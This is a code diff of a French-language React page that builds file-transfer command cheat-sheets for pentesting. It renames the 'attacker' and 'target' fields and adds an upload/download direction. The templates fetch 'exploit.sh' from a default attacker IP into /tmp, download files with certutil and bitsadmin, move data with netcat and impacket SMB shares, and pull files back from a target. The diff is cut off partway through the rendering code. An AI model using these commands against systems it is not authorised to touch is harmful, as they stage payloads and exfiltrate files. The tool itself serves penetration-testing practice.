@@ -23,18 +23,21 @@ import {
 type OSEnum = 'linux' | 'windows' | 'macos';
 
 interface ScenarioState {
-  attacker: {
+  source: {
     os: OSEnum;
     ip: string;
     port: string; // listen port (HTTP/NC/FTP)
+    sshPort?: string; // for scp/sftp when source needs SSH access
   };
-  target: {
+  destination: {
     os: OSEnum;
     ip: string;
     sshPort: string; // for scp/sftp
+    port?: string; // for HTTP server when destination is source
     filename: string;
     destPath: string; // folder or full path
   };
+  direction: 'upload' | 'download'; // upload: source -> destination, download: destination -> source
 }
 
 interface HistoryItem {
@@ -72,8 +75,9 @@ const SectionHeader: React.FC<{ title: string; right?: React.ReactNode }> = ({ t
 export const FileTransferPage: React.FC = () => {
   // Scénario appliqué (utilisé pour générer les commandes)
   const [scenario, setScenario] = useState<ScenarioState>({
-    attacker: { os: 'linux', ip: '10.10.14.1', port: '8000' },
-    target: { os: 'linux', ip: '10.10.10.10', sshPort: '22', filename: 'exploit.sh', destPath: '/tmp' },
+    source: { os: 'linux', ip: '10.10.14.1', port: '8000' },
+    destination: { os: 'linux', ip: '10.10.10.10', sshPort: '22', port: '8000', filename: 'exploit.sh', destPath: '/tmp' },
+    direction: 'download',
   });
   // Brouillon (modifications en cours avant d'appuyer sur "Générer")
   const [draftScenario, setDraftScenario] = useState<ScenarioState>(() => ({ ...scenario }));
@@ -101,15 +105,26 @@ export const FileTransferPage: React.FC = () => {
     localStorage.setItem(STORAGE_KEY_HISTORY, JSON.stringify(history));
   }, [history]);
 
-  const attackerLabel = useMemo(() => {
-    return scenario.attacker.os === 'windows' ? 'ATTACKBOX (Windows)' : scenario.attacker.os === 'macos' ? 'ATTACKBOX (macOS)' : 'ATTACKBOX (Linux)';
-  }, [scenario.attacker.os]);
+  const sourceLabel = useMemo(() => {
+    const osLabel = scenario.source.os === 'windows' ? 'Windows' : scenario.source.os === 'macos' ? 'macOS' : 'Linux';
+    return scenario.direction === 'upload' ? `📤 MACHINE DE DÉPART (${osLabel})` : `📥 MACHINE DE DÉPART (${osLabel})`;
+  }, [scenario.source.os, scenario.direction]);
 
-  const targetLabel = useMemo(() => {
-    return scenario.target.os === 'windows' ? 'TARGET (Windows)' : scenario.target.os === 'macos' ? 'TARGET (macOS)' : 'TARGET (Linux)';
-  }, [scenario.target.os]);
+  const destinationLabel = useMemo(() => {
+    const osLabel = scenario.destination.os === 'windows' ? 'Windows' : scenario.destination.os === 'macos' ? 'macOS' : 'Linux';
+    return scenario.direction === 'upload' ? `📤 MACHINE D'ARRIVÉE (${osLabel})` : `📥 MACHINE D'ARRIVÉE (${osLabel})`;
+  }, [scenario.destination.os, scenario.direction]);
 
-  const destFullPath = buildDestFullPath(scenario.target.destPath, scenario.target.filename, scenario.target.os);
+  // Labels dynamiques selon la direction
+  const getDirectionLabel = (method: string) => {
+    if (scenario.direction === 'upload') {
+      return `${method} : Envoi de fichier`;
+    } else {
+      return `${method} : Récupération de fichier`;
+    }
+  };
+
+  const destFullPath = buildDestFullPath(scenario.destination.destPath, scenario.destination.filename, scenario.destination.os);
 
   function onCopy(method: string, step: string, command: string) {
     copyToClipboard(command);
@@ -151,46 +166,90 @@ export const FileTransferPage: React.FC = () => {
 
   const fileInputRef = useRef<HTMLInputElement | null>(null);
 
-  // Command templates
-  const httpServerPython3 = `python3 -m http.server ${scenario.attacker.port} --bind 0.0.0.0`;
-  const httpServerPython2 = `python -m SimpleHTTPServer ${scenario.attacker.port}`;
-  const httpServerPHP = `php -S 0.0.0.0:${scenario.attacker.port}`;
-  const httpServerRuby = `ruby -run -e httpd . -p ${scenario.attacker.port}`;
-  const httpServerNode = `npx http-server -p ${scenario.attacker.port} --host 0.0.0.0`;
+  // Command templates - adaptées selon la direction
+  const httpServerPython3 = `python3 -m http.server ${scenario.source.port} --bind 0.0.0.0`;
+  const httpServerPython2 = `python -m SimpleHTTPServer ${scenario.source.port}`;
+  const httpServerPHP = `php -S 0.0.0.0:${scenario.source.port}`;
+  const httpServerRuby = `ruby -run -e httpd . -p ${scenario.source.port}`;
+  const httpServerNode = `npx http-server -p ${scenario.source.port} --host 0.0.0.0`;
 
-  const httpURL = `http://${scenario.attacker.ip}:${scenario.attacker.port}/${scenario.target.filename}`;
+  // URL et commandes adaptées selon la direction
+  const httpURL = scenario.direction === 'upload' 
+    ? `http://${scenario.source.ip}:${scenario.source.port}/${scenario.destination.filename}`
+    : `http://${scenario.destination.ip}:${scenario.destination.port}/${scenario.destination.filename}`;
+    
+  // Commandes de téléchargement (depuis la machine de destination)
   const wgetCmd = `wget "${httpURL}" -O "${destFullPath}"`;
   const curlCmd = `curl -o "${destFullPath}" "${httpURL}"`;
   const pwshCmd = `Invoke-WebRequest -Uri "${httpURL}" -OutFile "${destFullPath.replace(/\\/g, '\\\\')}"`;
   const certutilCmd = `certutil -urlcache -split -f "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
   const bitsadminCmd = `bitsadmin /transfer myDownloadJob /download /priority normal "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
 
-  const scpToTarget = `scp "${scenario.target.filename}" ${'user'}@${scenario.target.ip}:"${destFullPath}"`;
-  const scpCustomPort = `scp -P ${scenario.target.sshPort} "${scenario.target.filename}" ${'user'}@${scenario.target.ip}:"${destFullPath}"`;
-  const sftpInteractive = `sftp ${'user'}@${scenario.target.ip}`;
+  // Commandes SCP adaptées selon la direction
+  const scpToTarget = scenario.direction === 'upload' 
+    ? `scp "${scenario.destination.filename}" ${'user'}@${scenario.destination.ip}:"${destFullPath}"`
+    : `scp ${'user'}@${scenario.destination.ip}:"${scenario.destination.filename}" "${destFullPath}"`;
+    
+  const scpCustomPort = scenario.direction === 'upload'
+    ? `scp -P ${scenario.destination.sshPort} "${scenario.destination.filename}" ${'user'}@${scenario.destination.ip}:"${destFullPath}"`
+    : `scp -P ${scenario.destination.sshPort} ${'user'}@${scenario.destination.ip}:"${scenario.destination.filename}" "${destFullPath}"`;
+    
+  const sftpInteractive = `sftp ${'user'}@${scenario.destination.ip}`;
 
-  const ncReceiver = scenario.target.os === 'windows'
-    ? `ncat -l -p ${scenario.attacker.port} > "${destFullPath.replace(/\\/g, '\\\\')}"`
-    : `nc -l -p ${scenario.attacker.port} > "${destFullPath}"`;
-  const ncSender = (scenario.target.os === 'windows'
-    ? `ncat ${scenario.target.ip} ${scenario.attacker.port} < "${scenario.target.filename.replace(/\\/g, '\\\\')}"`
-    : `nc ${scenario.target.ip} ${scenario.attacker.port} < "${scenario.target.filename}"`);
+  // Commandes Netcat adaptées selon la direction
+  const ncReceiver = scenario.direction === 'upload' 
+    ? (scenario.destination.os === 'windows'
+        ? `ncat -l -p ${scenario.source.port} > "${destFullPath.replace(/\\/g, '\\\\')}"`
+        : `nc -l -p ${scenario.source.port} > "${destFullPath}"`)
+    : (scenario.source.os === 'windows'
+        ? `ncat -l -p ${scenario.destination.port || '8000'} > "${destFullPath.replace(/\\/g, '\\\\')}"`
+        : `nc -l -p ${scenario.destination.port || '8000'} > "${destFullPath}"`);
+        
+  const ncSender = scenario.direction === 'upload'
+    ? (scenario.destination.os === 'windows'
+        ? `ncat ${scenario.destination.ip} ${scenario.source.port} < "${scenario.destination.filename.replace(/\\/g, '\\\\')}"`
+        : `nc ${scenario.destination.ip} ${scenario.source.port} < "${scenario.destination.filename}"`)
+    : (scenario.source.os === 'windows'
+        ? `ncat ${scenario.source.ip} ${scenario.destination.port || '8000'} < "${scenario.destination.filename.replace(/\\/g, '\\\\')}"`
+        : `nc ${scenario.source.ip} ${scenario.destination.port || '8000'} < "${scenario.destination.filename}"`);
+        
   const ncTimeout = `timeout 30 ${ncSender}`;
 
-  const b64EncodeLinux = `base64 -w 0 "${scenario.target.filename}"`;
-  const b64EncodeWindows = `certutil -encode "${scenario.target.filename.replace(/\\/g, '\\\\')}" encoded.txt`;
+  // Commandes Base64 adaptées selon la direction
+  const b64EncodeLinux = scenario.direction === 'upload'
+    ? `base64 -w 0 "${scenario.destination.filename}"`
+    : `base64 -w 0 "${scenario.destination.filename}"`;
+    
+  const b64EncodeWindows = scenario.direction === 'upload'
+    ? `certutil -encode "${scenario.destination.filename.replace(/\\/g, '\\\\')}" encoded.txt`
+    : `certutil -encode "${scenario.destination.filename.replace(/\\/g, '\\\\')}" encoded.txt`;
+    
   const b64DecodeLinux = `echo "BASE64_STRING" | base64 -d > "${destFullPath}"`;
   const b64DecodeWindows = `certutil -decode encoded.txt "${destFullPath.replace(/\\/g, '\\\\')}"`;
 
+  // Commandes FTP adaptées selon la direction
   const ftpServer = `python3 -m pyftpdlib -p 21 -w`;
   const ftpServerAuth = `python3 -m pyftpdlib -p 21 -u user -P pass`;
-  const ftpClientLinux = `wget ftp://${scenario.attacker.ip}/${scenario.target.filename} -O "${destFullPath}"`;
-  const ftpClientWindows = `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.attacker.ip}/${scenario.target.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`;
+  
+  const ftpClientLinux = scenario.direction === 'upload'
+    ? `wget ftp://${scenario.source.ip}/${scenario.destination.filename} -O "${destFullPath}"`
+    : `wget ftp://${scenario.destination.ip || scenario.source.ip}/${scenario.destination.filename} -O "${destFullPath}"`;
+    
+  const ftpClientWindows = scenario.direction === 'upload'
+    ? `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.source.ip}/${scenario.destination.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`
+    : `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.destination.ip || scenario.source.ip}/${scenario.destination.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`;
 
+  // Commandes SMB adaptées selon la direction
   const smbServer = `impacket-smbserver share . -smb2support`;
   const smbServerAuth = `impacket-smbserver share . -smb2support -user user -password pass`;
-  const smbCopy = `copy "\\\\${scenario.attacker.ip}\\share\\${scenario.target.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
-  const smbRobocopy = `robocopy "\\\\${scenario.attacker.ip}\\share" "${(scenario.target.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.target.filename}"`;
+  
+  const smbCopy = scenario.direction === 'upload'
+    ? `copy "\\\\${scenario.source.ip}\\share\\${scenario.destination.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`
+    : `copy "\\\\${scenario.destination.ip || scenario.source.ip}\\share\\${scenario.destination.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
+    
+  const smbRobocopy = scenario.direction === 'upload'
+    ? `robocopy "\\\\${scenario.source.ip}\\share" "${(scenario.destination.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.destination.filename}"`
+    : `robocopy "\\\\${scenario.destination.ip || scenario.source.ip}\\share" "${(scenario.destination.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.destination.filename}"`;
 
   return (
     <div className="app-layout">
@@ -222,7 +281,11 @@ export const FileTransferPage: React.FC = () => {
                   <CardTitle className="text-slate-100">🎯 Configuration du Scénario</CardTitle>
                   <div className="flex items-center gap-2">
                     <div className="hidden md:block text-xs text-slate-400 mr-2">
-                      {scenario.attacker.ip}:{scenario.attacker.port} → {scenario.target.ip} • {scenario.target.filename} → {destFullPath}
+                      {scenario.direction === 'upload' ? (
+                        `📤 ${scenario.source.ip}:${scenario.source.port} → ${scenario.destination.ip} • ${scenario.destination.filename} → ${destFullPath}`
+                      ) : (
+                        `📥 ${scenario.destination.ip}:${scenario.destination.port || scenario.source.port} → ${scenario.source.ip} • ${scenario.destination.filename} → ${destFullPath}`
+                      )}
                     </div>
                     <Button
                       variant="outline"
@@ -249,106 +312,277 @@ export const FileTransferPage: React.FC = () => {
               {showScenarioContent && (
               <CardContent>
                 <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
-                  {/* Attacker */}
+                  {/* Source - Amélioré */}
                   <Card className="border-slate-700 bg-slate-800">
                     <CardHeader>
                       <CardTitle className="flex items-center gap-2 text-slate-100">
-                        <MonitorSmartphone className="w-4 h-4" /> Machine Attaquant
+                        <MonitorSmartphone className="w-4 h-4" /> Machine de Départ
                       </CardTitle>
+                      <div className="text-xs text-slate-400 mt-1">
+                        {draftScenario.direction === 'upload' ? '📤 Envoie le fichier' : '📥 Reçoit le fichier'}
+                      </div>
                     </CardHeader>
-                    <CardContent className="space-y-2">
+                    <CardContent className="space-y-3">
                       <div>
-                        <label className="text-sm text-slate-400">OS</label>
-                        <Select value={draftScenario.attacker.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, os: v}}))}>
+                        <label className="text-sm text-slate-400">Système d'exploitation</label>
+                        <Select value={draftScenario.source.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, source: {...s.source, os: v}}))}>
                           <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                           <SelectContent className="bg-slate-800 border-slate-600">
-                            <SelectItem value="linux">🐧 Linux</SelectItem>
-                            <SelectItem value="windows">🪟 Windows</SelectItem>
-                            <SelectItem value="macos">🍎 macOS</SelectItem>
+                            <SelectItem value="linux">🐧 Linux (Debian/Ubuntu/CentOS)</SelectItem>
+                            <SelectItem value="windows">🪟 Windows (10/11/Server)</SelectItem>
+                            <SelectItem value="macos">🍎 macOS (Monterey/Ventura)</SelectItem>
                           </SelectContent>
                         </Select>
                       </div>
-                      <div>
-                        <label className="text-sm text-slate-400">Adresse IP</label>
-                        <Input value={draftScenario.attacker.ip} onChange={(e) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, ip: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-sm text-slate-400">Adresse IP</label>
+                          <Input 
+                            value={draftScenario.source.ip} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, ip: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="192.168.1.100"
+                          />
+                        </div>
+                        <div>
+                          <label className="text-sm text-slate-400">Port HTTP</label>
+                          <Input 
+                            value={draftScenario.source.port} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, port: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="8000"
+                          />
+                        </div>
                       </div>
-                      <div>
-                        <label className="text-sm text-slate-400">Port d'écoute (HTTP/Netcat)</label>
-                        <Input value={draftScenario.attacker.port} onChange={(e) => setDraftScenario((s) => ({...s, attacker: {...s.attacker, port: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-sm text-slate-400">Port Netcat</label>
+                          <Input 
+                            value={draftScenario.source.port} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, port: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="4444"
+                          />
+                        </div>
+                        <div>
+                          <label className="text-sm text-slate-400">Port FTP</label>
+                          <Input 
+                            value="21" 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            disabled
+                          />
+                        </div>
+                      </div>
+                      
+                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
+                        🔧 <strong>Ports par défaut :</strong> HTTP: 8000, Netcat: 4444, FTP: 21, SMB: 445
                       </div>
                     </CardContent>
                   </Card>
 
-                  {/* middle arrow */}
-                  <div className="hidden lg:flex items-center justify-center">
-                    <div className="text-slate-300 text-4xl">➡️</div>
+                  {/* Direction selector - Agrandi */}
+                  <div className="hidden lg:flex flex-col items-center justify-center gap-4 p-4 bg-slate-700/30 rounded-lg border border-slate-600">
+                    <div className="text-center">
+                      <h4 className="text-lg font-semibold text-slate-200 mb-3">🎯 Direction du Transfert</h4>
+                      <div className="space-y-3">
+                        <div className="flex items-center gap-3">
+                          <div className={`p-2 rounded-lg border-2 ${draftScenario.direction === 'upload' ? 'border-blue-500 bg-blue-500/20' : 'border-slate-600 bg-slate-700/50'}`}>
+                            <input
+                              type="radio"
+                              id="upload"
+                              name="direction"
+                              value="upload"
+                              checked={draftScenario.direction === 'upload'}
+                              onChange={(e) => setDraftScenario((s) => ({...s, direction: e.target.value as 'upload' | 'download'}))}
+                              className="mr-2"
+                            />
+                            <label htmlFor="upload" className="text-slate-200 cursor-pointer">
+                              📤 Envoi de fichier
+                            </label>
+                          </div>
+                          <div className={`p-2 rounded-lg border-2 ${draftScenario.direction === 'download' ? 'border-blue-500 bg-blue-500/20' : 'border-slate-600 bg-slate-700/50'}`}>
+                            <input
+                              type="radio"
+                              id="download"
+                              name="direction"
+                              value="download"
+                              checked={draftScenario.direction === 'download'}
+                              onChange={(e) => setDraftScenario((s) => ({...s, direction: e.target.value as 'upload' | 'download'}))}
+                              className="mr-2"
+                            />
+                            <label htmlFor="download" className="text-slate-200 cursor-pointer">
+                              📥 Récupération de fichier
+                            </label>
+                          </div>
+                        </div>
+                        
+                        <div className="text-center">
+                          <div className="text-slate-300 text-3xl mb-2">
+                            {draftScenario.direction === 'upload' ? '➡️' : '⬅️'}
+                          </div>
+                          <div className="text-xs text-slate-400">
+                            {draftScenario.direction === 'upload' 
+                              ? 'Machine de Départ → Machine d\'Arrivée'
+                              : 'Machine d\'Arrivée → Machine de Départ'
+                            }
+                          </div>
+                        </div>
+                        
+                        <div className="text-xs text-slate-400 bg-slate-800 p-2 rounded border border-slate-600">
+                          💡 <strong>Conseil :</strong> {draftScenario.direction === 'upload' 
+                            ? 'Utilisez ce mode pour envoyer des fichiers depuis votre machine vers une cible'
+                            : 'Utilisez ce mode pour récupérer des fichiers depuis une cible vers votre machine'
+                          }
+                        </div>
+                      </div>
+                    </div>
                   </div>
 
-                  {/* Target */}
+                                    {/* Destination - Amélioré */}
                   <Card className="border-slate-700 bg-slate-800">
                     <CardHeader>
                       <CardTitle className="flex items-center gap-2 text-slate-100">
-                        <TargetIcon /> Machine Cible
+                        <TargetIcon /> Machine d'Arrivée
                       </CardTitle>
+                      <div className="text-xs text-slate-400 mt-1">
+                        {draftScenario.direction === 'upload' ? '📤 Reçoit le fichier' : '📥 Envoie le fichier'}
+                      </div>
                     </CardHeader>
-                    <CardContent className="space-y-2">
+                    <CardContent className="space-y-3">
                       <div>
-                        <label className="text-sm text-slate-400">OS</label>
-                        <Select value={draftScenario.target.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, target: {...s.target, os: v}}))}>
+                        <label className="text-sm text-slate-400">Système d'exploitation</label>
+                        <Select value={draftScenario.destination.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, destination: {...s.destination, os: v}}))}>
                           <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                           <SelectContent className="bg-slate-800 border-slate-600">
-                            <SelectItem value="linux">🐧 Linux</SelectItem>
-                            <SelectItem value="windows">🪟 Windows</SelectItem>
-                            <SelectItem value="macos">🍎 macOS</SelectItem>
+                            <SelectItem value="linux">🐧 Linux (Debian/Ubuntu/CentOS)</SelectItem>
+                            <SelectItem value="windows">🪟 Windows (10/11/Server)</SelectItem>
+                            <SelectItem value="macos">🍎 macOS (Monterey/Ventura)</SelectItem>
                           </SelectContent>
                         </Select>
                       </div>
+                      
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                         <div>
-                          <label className="text-sm text-slate-400">IP de la cible</label>
-                          <Input value={draftScenario.target.ip} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, ip: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                          <label className="text-sm text-slate-400">Adresse IP</label>
+                          <Input 
+                            value={draftScenario.destination.ip} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, ip: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="192.168.1.200"
+                          />
                         </div>
                         <div>
                           <label className="text-sm text-slate-400">Port SSH</label>
-                          <Input value={draftScenario.target.sshPort} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, sshPort: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                          <Input 
+                            value={draftScenario.destination.sshPort} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, sshPort: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="22"
+                          />
                         </div>
                       </div>
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-sm text-slate-400">Port HTTP (optionnel)</label>
+                          <Input 
+                            value={draftScenario.destination.port || ''} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, port: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="8000" 
+                          />
+                        </div>
+                        <div>
+                          <label className="text-sm text-slate-400">Port SMB</label>
+                          <Input 
+                            value="445" 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            disabled
+                          />
+                        </div>
+                      </div>
+                      
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                         <div>
                           <label className="text-sm text-slate-400">Nom du fichier</label>
-                          <Input value={draftScenario.target.filename} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, filename: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                          <Input 
+                            value={draftScenario.destination.filename} 
+                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, filename: e.target.value}}))} 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            placeholder="exploit.sh"
+                          />
                         </div>
                         <div>
-                          <label className="text-sm text-slate-400">Destination</label>
-                          <Input value={draftScenario.target.destPath} onChange={(e) => setDraftScenario((s) => ({...s, target: {...s.target, destPath: e.target.value}}))} className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" />
+                          <label className="text-sm text-slate-400">Taille estimée</label>
+                          <Input 
+                            value="1-10 MB" 
+                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                            disabled
+                          />
                         </div>
                       </div>
-                      <div className="text-xs text-slate-400">Chemin final (brouillon): <code className="text-slate-200">{buildDestFullPath(draftScenario.target.destPath, draftScenario.target.filename, draftScenario.target.os)}</code></div>
-                      <div className="flex items-center gap-2 pt-2">
-                        <Button
-                          variant="default"
-                          className="bg-blue-600 hover:bg-blue-700"
-                          onClick={() => {
-                            setScenario({ ...draftScenario });
-                            setShowScenarioContent(false);
-                            toast.success('Commandes générées');
-                          }}
-                        >
-                          🚀 Générer les Commandes
-                        </Button>
-                        <Button
-                          variant="outline"
-                          className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600"
-                          onClick={() => setDraftScenario({
-                            attacker: { os: 'linux', ip: '10.10.14.1', port: '8000' },
-                            target: { os: 'linux', ip: '10.10.10.10', sshPort: '22', filename: 'exploit.sh', destPath: '/tmp' },
-                          })}
-                        >
-                          🔄 Réinitialiser
-                        </Button>
+                      
+                      <div>
+                        <label className="text-sm text-slate-400">Chemin de destination</label>
+                        <Input 
+                          value={draftScenario.destination.destPath} 
+                          onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, destPath: e.target.value}}))} 
+                          className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
+                          placeholder={draftScenario.destination.os === 'windows' ? 'C:\\temp' : '/tmp'}
+                        />
+                      </div>
+                      
+                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
+                        📁 <strong>Chemin final :</strong> <code className="text-slate-200">{buildDestFullPath(draftScenario.destination.destPath, draftScenario.destination.filename, draftScenario.destination.os)}</code>
+                      </div>
+                      
+                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
+                        🔧 <strong>Ports par défaut :</strong> SSH: 22, HTTP: 8000, SMB: 445, FTP: 21
                       </div>
                     </CardContent>
                   </Card>
+                </div>
+                
+                {/* Boutons d'action en bas */}
+                <div className="flex items-center justify-center gap-4 pt-6 border-t border-slate-600">
+                  <Button
+                    variant="default"
+                    size="lg"
+                    className="bg-blue-600 hover:bg-blue-700 px-8"
+                    onClick={() => {
+                      setScenario({ ...draftScenario });
+                      setShowScenarioContent(false);
+                      toast.success('Commandes générées avec succès !');
+                    }}
+                  >
+                    🚀 Générer les Commandes
+                  </Button>
+                  <Button
+                    variant="outline"
+                    size="lg"
+                    className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600 px-8"
+                    onClick={() => setDraftScenario({
+                      source: { os: 'linux', ip: '10.10.14.1', port: '8000' },
+                      destination: { os: 'linux', ip: '10.10.10.10', sshPort: '22', port: '8000', filename: 'exploit.sh', destPath: '/tmp' },
+                      direction: 'download',
+                    })}
+                  >
+                    🔄 Réinitialiser
+                  </Button>
+                  <Button
+                    variant="outline"
+                    size="lg"
+                    className="bg-green-700 border-green-600 text-green-200 hover:bg-green-600 px-8"
+                    onClick={() => {
+                      // Sauvegarder le scénario actuel
+                      localStorage.setItem('savedFileTransferScenario', JSON.stringify(draftScenario));
+                      toast.success('Scénario sauvegardé !');
+                    }}
+                  >
+                    💾 Sauvegarder
+                  </Button>
                 </div>
               </CardContent>
               )}
@@ -367,7 +601,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><Globe className="w-4 h-4" /> Serveur HTTP</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><Globe className="w-4 h-4" /> {getDirectionLabel('Serveur HTTP')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, http: !e.http}))}>
                     {expanded.http ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -377,13 +611,13 @@ export const FileTransferPage: React.FC = () => {
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'Python 3 (recommandé)', cmd: httpServerPython3}, {label: 'Python 2 (legacy)', cmd: httpServerPython2}, {label: 'PHP', cmd: httpServerPHP}, {label: 'Ruby', cmd: httpServerRuby}, {label: 'Node.js', cmd: httpServerNode}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -391,25 +625,25 @@ export const FileTransferPage: React.FC = () => {
                     </div>
                   </div>
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
-                    <div className="space-y-2">
-                      {(scenario.target.os === 'windows' ? [
-                        {label: 'PowerShell (Windows)', cmd: pwshCmd},
-                        {label: 'certutil (Windows)', cmd: certutilCmd},
-                        {label: 'bitsadmin (Windows)', cmd: bitsadminCmd},
-                      ] : [
-                        {label: 'wget (Linux/macOS)', cmd: wgetCmd},
-                        {label: 'curl (Linux/macOS)', cmd: curlCmd},
-                      ]).map(({label, cmd}) => (
-                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
-                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
-                            <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
-                          </div>
-                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
+                                            <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
+                        <div className="space-y-2">
+                          {(scenario.destination.os === 'windows' ? [
+                            {label: 'PowerShell (Windows)', cmd: pwshCmd},
+                            {label: 'certutil (Windows)', cmd: certutilCmd},
+                            {label: 'bitsadmin (Windows)', cmd: bitsadminCmd},
+                          ] : [
+                            {label: 'wget (Linux/macOS)', cmd: wgetCmd},
+                            {label: 'curl (Linux/macOS)', cmd: curlCmd},
+                          ]).map(({label, cmd}) => (
+                            <div key={label} className="bg-slate-800 rounded border border-slate-600">
+                              <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
+                                <span className="text-xs text-slate-400">{label}</span>
